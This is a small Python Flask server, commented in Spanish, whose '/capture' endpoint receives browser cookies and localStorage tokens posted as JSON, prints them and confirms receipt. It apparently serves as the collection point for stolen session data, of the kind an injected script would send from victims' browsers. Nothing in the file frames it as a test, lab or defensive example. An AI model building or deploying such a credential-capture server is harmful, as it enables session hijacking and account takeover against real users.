from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    cookies = data.get('cookies')
    local_storage_tokens = data.get('localStorageTokens')

    # Aquí puedes procesar las cookies y tokens como desees
    print("Cookies:", cookies)
    print("Local Storage Tokens:", local_storage_tokens)

    return jsonify({"message": "Datos recibidos con éxito"})

if __name__ == '__main__':
    app.run(debug=True)
